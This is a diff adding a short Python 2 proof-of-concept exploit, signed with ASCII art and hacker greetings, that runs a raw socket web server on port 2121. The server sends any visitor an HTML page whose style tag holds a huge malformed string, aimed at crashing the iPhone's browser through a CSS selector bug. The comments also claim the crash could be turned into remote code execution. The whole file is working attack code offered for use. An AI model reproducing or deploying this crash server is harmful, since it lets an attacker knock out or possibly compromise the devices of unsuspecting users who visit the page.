@@ -1,0 +1,62 @@
+#!/usr/bin/python
+#                       ,
+#                      dM
+#                      MMr
+#                     4MMML                  .
+#                     MMMMM.                xf
+#     .              "M6MMM               .MM-
+#      Mh..          +MM5MMM            .MMMM
+#      .MMM.         .MMMMML.          MMMMMh
+#       )MMMh.        MM5MMM         MMMMMMM
+#        3MMMMx.     'MMM3MMf      xnMMMMMM"
+#        '*MMMMM      MMMMMM.     nMMMMMMP"
+#          *MMMMMx    "MMM5M\    .MMMMMMM=
+#           *MMMMMh   "MMMMM"   JMMMMMMP
+#             MMMMMM   GMMMM.  dMMMMMM            .
+#              MMMMMM  "MMMM  .MMMMM(        .nnMP"
+#   ..          *MMMMx  MMM"  dMMMM"    .nnMMMMM*
+#    "MMn...     'MMMMr 'MM   MMM"   .nMMMMMMM*"
+#     "4MMMMnn..   *MMM  MM  MMP"  .dMMMMMMM""
+#       ^MMMMMMMMx.  *ML "M .M*  .MMMMMM**"
+#          *PMMMMMMhn. *x > M  .MMMM**""
+#             ""**MMMMhx/.h/ .=*"
+#                      .3P"%....
+#             [t12]  nP"     "*MMnx 
+
+#		    SMOKE WEED
+#greetz to my blackhatz and baycatz
+#iPhone CSS::Selector crash
+#this Python script acts as a web server and sends a malformed long string to the CSS <style> tag
+#this is a remote crash bug, hoever an analysis of the debug dump shows remote code execution capability, I am just lazy
+
+import sys, socket;
+
+def main():
+	junk = "*>" * 120000;
+	
+	html = """
+		<html>
+		<head>
+		<style type="text/css">
+		""";
+
+	html += junk;
+
+	html += """
+		body {background: blue;}
+		</style>
+		</head>
+		</html>
+		""";
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
+	s.bind(('',2121));
+	s.listen(1);
+	
+	while True:
+		channel, details = s.accept();
+		print channel.recv(1024);
+		channel.send(html);
+		channel.close();
+
+main();
